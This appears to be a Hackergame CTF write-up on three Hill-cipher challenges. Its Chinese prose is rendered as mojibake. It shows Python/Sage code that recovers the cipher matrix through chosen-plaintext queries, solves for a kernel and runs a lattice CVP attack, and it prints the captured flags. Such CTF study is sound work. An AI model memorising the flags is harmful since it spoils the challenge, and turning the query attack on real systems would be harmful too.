è¿™é“é¢˜æ‹¿åˆ°é¢˜ç›®ä¹‹åçš„ç¬¬ä¸€ç›´è§‰æ˜¯å¯¹äºä»»æ„çš„ $a > 0$ï¼Œæ„é€  $b = a \oplus 1$ï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°å¯¹äºä»»æ„ $c > 0$ï¼Œæœ‰ $\text{abs}(c \oplus a - c \oplus b) = 1$

ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬å¾—çŸ¥ $c \oplus a$ å’Œ $c \oplus b$ çš„å¤§å°å…³ç³»çš„æ—¶å€™ï¼Œä¹Ÿå³ä¸‹å¼ä¸­ $a_k \oplus b_k \oplus 1 > a_k \oplus b_k$ æ—¶ï¼Œå¯ä»¥æ„é€ å‡ºå½¢å¦‚ï¼š

$$
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ b_k \oplus 1 \\ \vdots\\ b_n \\ \end{bmatrix}\right) -
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ b_k \\ \vdots\\ b_n \\ \end{bmatrix}\right) =
H \begin{bmatrix} 0 \\ 0 \\ \vdots \\ 1 \\ \vdots\\ 0 \\ \end{bmatrix} = H_k
$$

è¿™é‡Œçš„ $H_k$ è¡¨ç¤ºçš„æ˜¯çŸ©é˜µ $H$ çš„ç¬¬ $k$ åˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å¾—åˆ°çŸ©é˜µ $H$ çš„ä¸€åˆ—ã€‚ä¸‹é¢åŸºäºè¿™ç§åŸºæœ¬æ€è·¯æ„é€ æ•´ä¸ªçŸ©é˜µã€‚

æ³¨æ„æˆ‘ä»¬ä¸Šè¿°è®¨è®ºçš„å‰æéƒ½æ˜¯æˆ‘ä»¬èƒ½å¤Ÿå¾—çŸ¥ä¸€ä½çš„å¤§å°å…³ç³»ï¼Œä½†æ˜¯åœ¨è¿™é“é¢˜ä¸­ï¼Œè¿™äº›å¤§å°å…³ç³»æ˜¯éšæœºçš„ï¼Œè¿™ç§éšæœºä¼šå¢åŠ æˆ‘ä»¬æŸ¥è¯¢çš„æˆæœ¬ï¼Œå› æ­¤éœ€è¦å…³æ³¨åˆ°å¦ä¸€ç‚¹ï¼šè¢«åŠ å¯†çš„æ˜æ–‡æ˜¯ ASCII ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä¿è¯æ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä½éƒ½æ˜¯ 0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›´æ¥çš„æ„é€ æ¥å¾—åˆ°è¿™ä¸€ä¿¡æ¯ã€‚

$$
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ 128 \\ \vdots\\ b_n \\ \end{bmatrix}\right) -
H \left(\begin{bmatrix} a_1\\ a_2\\ \vdots \\ a_k\\ \vdots\\ a_n \\ \end{bmatrix} \oplus
\begin{bmatrix} b_1\\ b_2\\ \vdots \\ 0 \\ \vdots\\ b_n \\ \end{bmatrix}\right) =
H \begin{bmatrix} 0 \\ 0 \\ \vdots \\ 128 \\ \vdots\\ 0 \\ \end{bmatrix} = H_k ^ {128} \bmod 257
$$

è¿™æ—¶å€™å¾—åˆ°çš„ç»“æœéœ€è¦ç»è¿‡é€šè¿‡åœ¨æ¨¡ 257 ä¸‹æ±‚ 128 æ¬¡æ–¹çš„åŸåƒï¼Œå¾—åˆ°ï¼š$ H_k = h_{hz} ^ {255} = (H_k ^ {128}) ^ {255} \bmod 257$

é€šè¿‡è¿™ä¸€çš„éå† 256 è½®åï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°**åŸºæœ¬**å…¨éƒ¨çš„çŸ©é˜µä¿¡æ¯ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®å‘å°±å‘åœ¨ç»“æœå‘é‡ä¸­çš„ 0 å­˜åœ¨å·®å¼‚æ€§ï¼šå¯èƒ½æ˜¯ 0 æˆ–è€…æ˜¯ 256ã€‚

å¦‚æœå¯¹äºä¸¤æ¬¡æŸ¥è¯¢çš„ç»“æœ $H (a \oplus b_{128}) = h_h$ å’Œ $H (a \oplus b_{0}) = h_z$ ä¸­å‡ä¸å­˜åœ¨ 0ï¼Œåˆ™å¯ä»¥æ­£ç¡®å¾—åˆ°ç»“æœ $h_k$ï¼Œå¦åˆ™ï¼Œæˆ‘ä»¬éœ€è¦æ›´å¤šçš„ä¿¡æ¯ï¼Œå¹¶è®°å½•æ­¤å·®å€¼ä¸º $h_{hz} = h_{h} - h_{z}$

ä¸å¦¨è€ƒè™‘ä½¿å¾—ç¬¬ä¸‰ä¸ªå‘é‡ä¸­çš„ç¬¬ $k$ ä½ä¸º `0b01000000`ï¼Œè®°åš $b_{64}$ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°è¯•å¾—åˆ° $H (a \oplus b_{64}) = h_t$ï¼Œè¿›è€Œå¾—åˆ° $h_{tz} = h_t - h_z$ ä¸ $h_{zt} = h_z - h_t$ã€‚

å½“å…¶ä¸­ä¸€ä¸ªçš„ç¬¬ $k$ ä½å·®å€¼ä¸º 64 æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å®ƒæ¥å¾—åˆ° $ H_k = (H_k ^ {64}) ^ {253} \bmod 257$ã€‚

å¯ä»¥è¯æ˜ï¼Œæ˜¯å¦ä¸º 0 å¯¹äº $H_k$ çš„å¤§éƒ¨åˆ†æ±‚è§£æ²¡æœ‰å½±å“ï¼Œæ­¤æ—¶æˆ‘ä»¬è¿˜å¯ä»¥åè¿‡æ¥åˆ©ç”¨ $h_{hz}$ ä¸ $h_{zt}$ åŠ $h_{hz}$ äºŒè€…çš„ç›¸ä¼¼åº¦æ¥ç¡®è®¤åŸå§‹å‘é‡çš„ç¬¬ 7 æ¯”ç‰¹æ˜¯ä»€ä¹ˆï¼Œè¿›è€Œè¿˜èƒ½ä¾æ®æ­¤ä¿¡æ¯ï¼Œæ ¹æ® $h_{ht} = h_h - h_t$ï¼Œä»è€Œå¾—åˆ°å¦ä¸€ä¸ª $H_k$ çš„å‚è€ƒå€¼ï¼š

$$
H_k = \left\{\begin{matrix}
h_{ht} ^ {253} ,& \text{if } h_{tz}^{253} \text{ looks like } h_{hz} ^ {255}, & \text{bit 7} = 0 \\
\\
h_{ht} ^ {170} ,& \text{if } h_{zt}^{253} \text{ looks like } h_{hz} ^ {255}, & \text{bit 7} = 1
\end{matrix}\right.
$$

æˆ‘ä»¬å¯ä»¥å‡è®¾ä¸Šè¿°ä¸‰ä¸ª $h_h, h_t, h_z$ ä¹‹é—´åŒä¸€ä¸ªä½ç½®æ€»æ˜¯ä¸åŒæ—¶ä¸º 0ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‚è€ƒä¸‰ä¸ªç»“æœè¿›è¡Œäº’ç›¸ä¿®æ­£ï¼Œä»è€Œå¾—åˆ°å‡†ç¡®çš„ $H_k$ã€‚

å®é™…æƒ…å†µä¸‹ï¼Œè¿™æ ·çš„æ¦‚ç‡å¾ˆå°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡æ–°æ„é€ ã€é‡æ–°æŸ¥è¯¢ä¸‰ä¸ªå‘é‡çš„æ–¹å¼è·å–æ›´å¤šçš„ä¿¡æ¯ï¼Œæœ€ç»ˆå¾—åˆ° $H_k$ã€‚

```py
def dump_matrix(sh, n=128):
    pwnlog.info('dumping matrix...')

    mat = []

    vector = np.random.randint(0, 127, size=(n, 1), dtype=np.uint8)
    vec_ans = commvec(sh, vector)

    bar = tqdm(range(n))
    for i in bar:
        bar.set_description(f"dumping matrix... {i} @ {req_times}")
        retry = 0
        while True:
            base = np.random.randint(0, 127, size=(n, 1), dtype=np.uint8)
            zero = base.copy()
            high = base.copy()

            high[i] = 0b10000000 + retry
            zero[i] = 0b00000000 + retry

            high_ans = commvec(sh, high)
            zero_ans = commvec(sh, zero)

            succ, result = check_stage_1(high_ans, zero_ans)

            if succ:
                mat.append(result)
                break

            # need more test to determine the result
            test = base.copy()
            test[i] = 0b01000000 + retry
            test_ans = commvec(sh, test)

            succ, result = check_stage_2(high_ans, zero_ans, test_ans)

            if succ:
                mat.append(result)
                break

            retry += 1

    pwnlog.info(f"total requests: {req_times}")
    mat = np.matrix(np.array(mat).reshape(n, n))
    return mat, vector, vec_ans

def check_stage_1(high, zero):
    high_guess = try_get_row(high, zero, 255)
    if sum(high == 0) == 0 and sum(zero == 0) == 0:
        return True, high_guess
    return False, None

def check_stage_2(high, zero, test):
    need_retry = False

    high_guess = try_get_row(high, zero, 255)

    # inverse(64, 257) = 253

    # 0b01 ^ 0b01 -> 0b00 / 0b00 ^ 0b01 -> 0b01
    # while the input is 0b01, zero - test
    zt_guess = try_get_row(zero, test, 253)

    # 0b01 ^ 0b00 -> 0b01 / 0b00 ^ 0b00 -> 0b00
    # while the input is 0b00, test - zero
    tz_guess = try_get_row(test, zero, 253)

    # use_tz means the sixth bit is 1
    use_tz = get_nearest(high_guess, tz_guess, zt_guess)

    if use_tz:
        # inverse(64, 257) = 253
        ht_guess = try_get_row(high, test, 253)
    else:
        # inverse(192, 257) = 170
        ht_guess = try_get_row(high, test, 170)

    high_zeros = np.where(high == 0)[0]
    zero_zeros = np.where(zero == 0)[0]
    test_zeros = np.where(test == 0)[0]

    # check if there are two zero in the same position
    high_set = set(high_zeros)
    zero_set = set(zero_zeros)
    test_set = set(test_zeros)

    if len(high_set & zero_set) + len(high_set & test_set) + len(zero_set & test_set) > 0:
        return False, None

    for pos in high_zeros:
        if use_tz:
            high_guess[pos] = tz_guess[pos]
        else:
            high_guess[pos] = zt_guess[pos]

    for pos in zero_zeros:
        high_guess[pos] = ht_guess[pos]

    return True, high_guess

def try_get_row(a, b, inv):
    return ((a - b) * inv) % 257

def test_pair(high_guess, ga, gb):
    return sum(ga - high_guess) == 0 or sum(gb - high_guess) == 0

def get_nearest(target, a, b):
    return sum(abs(a - target)) < sum(abs(b - target))
```

ç»è¿‡æµ‹è¯•ï¼Œä¸Šè¿°ä»£ç æ€»æ˜¯èƒ½åœ¨çº¦ 370 æ¬¡è¯·æ±‚ä¸­å¾—åˆ°å®Œæ•´çš„çŸ©é˜µã€‚

ä¹‹åæ±‚é€†åï¼Œå°±å¯ä»¥å¾—åˆ°åŸå§‹çš„çŸ©é˜µï¼Œè¿›è€Œå¾—åˆ°åŸå§‹çš„å‘é‡ï¼Œå¾—åˆ° flagã€‚

```py
def verify(mat, vec, enc_flag):
    ring = Zmod(257)
    smat = matrix(ring, mat.T)

    if not smat.is_invertible():
        return False, None, None

    rev = smat ** (-1)
    flag_enc = vector(ring, enc_flag)
    dec = vector(ZZ, rev * flag_enc) % 256
    dec = np.array(dec)
    res = bytes([i ^ j for i, j in zip(dec, vec.reshape(-1))])

    print("res: ", res)

    return True, smat, res
```


**`flag{G0od_ma7hem5tical_f0undat1on_lin3ar_al9eBra_makes_sense_2cf6937397}`**

### å¸Œå°”ä¹‹æ ¸

åœ¨å¾—åˆ°å®Œæ•´çš„çŸ©é˜µä¹‹åï¼Œç¬¬äºŒä¸ªé—®é¢˜ä¹Ÿå°±æ˜¯ï¼š

$$ Hx = x \Rightarrow (H - I)x = 0 \bmod 257 $$

æ ¹æ® Copilot çš„è§£é‡Šï¼Œæ±‚è§£è¿™æ ·çš„ $x$ å®é™…ä¸Šå°±æ˜¯æ±‚è§£çŸ©é˜µ $H - I$ çš„ kernelï¼Œå› æ­¤å¯ä»¥ç›´æ¥å†™å‡ºä»£ç ï¼š

```py
def find_vectors(H):
    # åˆ›å»ºä¸€ä¸ªæ¨¡ 257 çš„ç¯
    Z257 = IntegerModRing(257)
    # åˆ›å»ºä¸€ä¸ªåœ¨æ¨¡ 257 çš„ç¯ä¸Šçš„çŸ©é˜µ
    H_Z257 = matrix(Z257, H)
    # è®¡ç®— A - I
    I = matrix.identity(H_Z257.nrows())
    H_minus_I = H_Z257 - I
    # æ±‚è§£ (A - I)x = 0
    solution = H_minus_I.right_kernel().basis()
    return solution
```

**`flag{solving_linear_equations_1s_so_ea5y!!_*^*_amazing_rank_**><**_88924a27af}`**

### å¸Œå°”ä¹‹ç§˜

æœ€åï¼Œæˆ‘ä»¬ä¸Šä¸€æ­¥ä¸­çš„ $ker (H - I)$ æ˜¯ 128 ä¸ªçº¿æ€§æ— å…³çš„å‘é‡ï¼Œåˆ™è¿™ä¸€é—®çš„ç›®æ ‡å¯ä»¥è½¬åŒ–ä¸ºåœ¨è¿™ 128 ä¸ªå‘é‡æ„æˆçš„æ¨¡ 257 çš„æ ¼ä¸­ï¼Œæ‰¾åˆ°è·ç¦» 128 å”¯å‘é‡ $[80, \dots, 80]^T$ æœ€è¿‘çš„å‘é‡ã€‚

ä¹Ÿå°±æ˜¯è½¬åŒ–ä¸ºæ ¼çš„ CVP é—®é¢˜ã€‚

è¿™é‡Œç›´æ¥å‚è€ƒ mcfx åœ¨ [ç¯ï¼Œç­‰ç¯ç­‰ç¯](https://github.com/GZTimeWalker/hackergame2021-writeups/blob/master/players/mcfx/writeup.md#%E4%BB%A3%E7%A0%81) ä¸­æåˆ°çš„æ–¹æ³•ï¼š

```py
def cvp(vectors):
    mat = [[int(j) for j in i] + [0] for i in vectors]

    for i in range(128):
        arr = [0] * 129
        arr[i] = 257
        mat.append(arr)

    mat.append([-0x50] * 128 + [0xdead])

    # ans = Matrix(mat).LLL() # not very good
    ans = Matrix(mat).BKZ()

    n = len(mat)

    for i in range(n):
        if ans[i][128]:
            for j in range(128):
                mat[-1][j] = ans[i][j] - mat[-1][j]
            break

    return mat[-1][:128]

def check(vec):
    svec = vector(Zmod(257), vec)
    return all(0x20 <= i < 0x79 for i in vec) and smat * svec == svec
```

**`flag{lattice_reduction_makes_everything_short_and_babai_finds_things_as_near_as_you_want_ade4bc1fa6}`**

## åè®°

åˆæ˜¯ä¸€å¹´æï¼Œåšå®¢æ…¢ç‚¹æ›´æ–°ï¼Œè¿™ä»½å…ˆæ‰”åˆ°ä»“åº“å•¦ã€‚ç© Hackergame ç©çš„ï¼
